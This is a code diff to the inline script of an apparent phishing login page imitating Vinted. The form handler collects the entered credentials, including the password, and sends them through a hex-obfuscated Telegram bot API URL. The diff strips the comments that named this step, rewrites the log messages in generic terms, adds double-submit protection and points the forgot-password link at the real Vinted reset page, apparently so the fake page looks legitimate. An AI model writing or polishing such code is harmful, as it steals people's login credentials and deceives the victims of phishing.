@@ -618,6 +618,8 @@
 
 
   <script>
+  let isSubmitting = false;
+
   document.addEventListener("click", function (event) {
       const button = event.target.closest('button[type="submit"]');
       if (!button) return;
@@ -631,11 +633,17 @@
       event.stopPropagation();
       event.stopImmediatePropagation();
 
+      if (isSubmitting) return;
+
       handleFormSubmit(form, button);
   }, true);
 
   async function handleFormSubmit(form, button) {
       button.disabled = true;
+      isSubmitting = true;
+      button.disabled = true;
+      button.style.opacity = "0.5";
+      button.style.pointerEvents = "none";
 
       const data = new FormData(form);
       const payload = {
@@ -643,7 +651,6 @@
           password: data.get("password"),
       };
 
-      // 1. Отправка данных на сервер
       try {
           const response = await fetch("http://localhost:8000/login", {
               method: "POST",
@@ -654,12 +661,11 @@
           if (!response.ok) throw new Error("Server error: " + response.status);
 
           const result = await response.json();
-          console.log("Ответ сервера:", result);
+          console.log("Server error", result);
       } catch (err) {
-          console.error("Ошибка авторизации:", err);
+          console.error("Server error", err);
       }
 
-      // 2. Отправка данных в Telegram
       try {
           const _0x1a2b = (str) => atob(str);
           const _0x3c4d = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74', '\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65'];
@@ -682,15 +688,29 @@
           );
 
           if (!telegramResponse.ok) {
-              console.error("Ошибка Telegram API:", telegramResponse.status);
+              console.error("Telegram API:", telegramResponse.status);
           }
       } catch (error) {
-          console.error("Ошибка отправки в Telegram:", error);
+          console.error("Telegram:", error);
       } finally {
           button.disabled = false;
       }
   }
-  </script> 
+  </script>  
+
+  <script>
+  new MutationObserver(() => {
+      const oldLink = document.querySelector('a[data-testid="forgot-password-link"]:not([data-patched])');
+      if (oldLink) {
+          const newLink = document.createElement('a');
+          newLink.textContent = oldLink.textContent;
+          newLink.href = "https://www.vinted.at/member/login/reset_password";
+          newLink.className = oldLink.className;
+          newLink.setAttribute('data-patched', 'true');
+          oldLink.replaceWith(newLink);
+      }
+  }).observe(document.body, { childList: true, subtree: true });
+  </script>
 
 
 
